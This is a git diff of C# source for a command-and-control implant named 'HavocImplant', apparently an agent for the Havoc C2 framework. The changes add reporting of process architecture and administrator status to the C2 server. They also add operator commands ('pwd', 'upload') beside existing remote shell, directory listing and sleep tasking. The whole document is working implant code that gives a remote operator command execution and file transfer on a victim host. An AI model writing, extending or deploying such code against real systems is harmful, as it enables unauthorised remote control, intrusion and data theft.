@@ -3,8 +3,8 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using System.Net.Http;
 using System.Net;
+//using System.Net;
 using System.Collections;
 using System.IO;
 using System.Diagnostics;
@@ -13,6 +13,7 @@ using System.Text.RegularExpressions;
 using Microsoft.Win32;
 using System.Security.Cryptography;
 using System.Management;
+using System.Runtime.InteropServices;
 
 namespace HavocImplant
 {
@@ -51,15 +52,37 @@ namespace HavocImplant
         string PID = Process.GetCurrentProcess().Id.ToString();
         string PPID = "ppid here";
         string osBuild = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuild");
-        string osArch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432");
+        string osArch = string.Empty;
+        int Elevated = 0;
         string processName = Process.GetCurrentProcess().ProcessName;
         string osVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
 
+
+        [DllImport("shell32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool IsUserAnAdmin();
         static void Main(string[] args) // Looping through tasks and stuff
         {
             Implant implant = new Implant();
+            if (Environment.Is64BitProcess)
+            {
+                implant.osArch = "x64";
+            }
+            else 
+            {
+                implant.osArch = "x86";
+            }
+            if (IsUserAnAdmin())
+            {
+                implant.Elevated = 1;
+            }
+            else 
+            {
+                implant.Elevated = 0;
+            }
+           
             Random rand = new Random();
-            if (implant.secure) ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            if (implant.secure) ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
 
             while (!implant.registered) implant.Register();
 
@@ -124,14 +147,16 @@ namespace HavocImplant
                         int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
                         Console.WriteLine("The ID is: {0}", taskId);
 
-                        switch (command.Split(' ')[0])
+                        switch (command.Split(' ')[0].ToLower())
                         {
                             case "shell":
                                 Thread shellThread = new Thread(() => AgentFunctions.Shell.Run(implant, command.Substring(5).Trim(), taskId));
                                 shellThread.Start();
                                 break;
                             case "goodbye":
-                                Console.WriteLine("It is die time my dudes"); Environment.Exit(Environment.ExitCode); break;
+                                Console.WriteLine("It is die time my dudes"); 
+                                Environment.Exit(Environment.ExitCode);
+                                break;
                             case "sleep":
                                 Thread sleepThread = new Thread(() => AgentFunctions.Sleep.Run(implant, command.Substring(5).Trim(), taskId));
                                 sleepThread.Start();
@@ -139,6 +164,15 @@ namespace HavocImplant
                             case "ls":
                                 Thread lsThread = new Thread(() => AgentFunctions.Ls.Run(implant, command.Substring(2).Trim(), taskId));
                                 lsThread.Start();
+                                break;
+                            case "pwd":
+                                Thread pwdthread = new Thread(() => AgentFunctions.pwd.Pwd(implant, taskId));
+                                pwdthread.Start();
+                                break;
+                            case "upload":
+                                Thread uploadthread = new Thread(()=> AgentFunctions.UpAndDown.UploadFile(implant,command.Substring(6).Trim(),taskId));
+                                uploadthread.Start();
+                                uploadthread.Join();
                                 break;
                         }
                     }
@@ -211,8 +245,8 @@ namespace HavocImplant
             registrationAttrs.Add("Process Path", "process path here");
             registrationAttrs.Add("Process ID", PID);
             registrationAttrs.Add("Process Parent ID", PPID);
-            registrationAttrs.Add("Process Arch", "x64");
-            registrationAttrs.Add("Process Elevated", "elevated status here");
+            registrationAttrs.Add("Process Arch", osArch.ToString());
+            registrationAttrs.Add("Process Elevated", Elevated.ToString());
             registrationAttrs.Add("OS Build", osBuild);
             registrationAttrs.Add("OS Arch", osArch);
             registrationAttrs.Add("Sleep", (sleepTime / 1000).ToString());
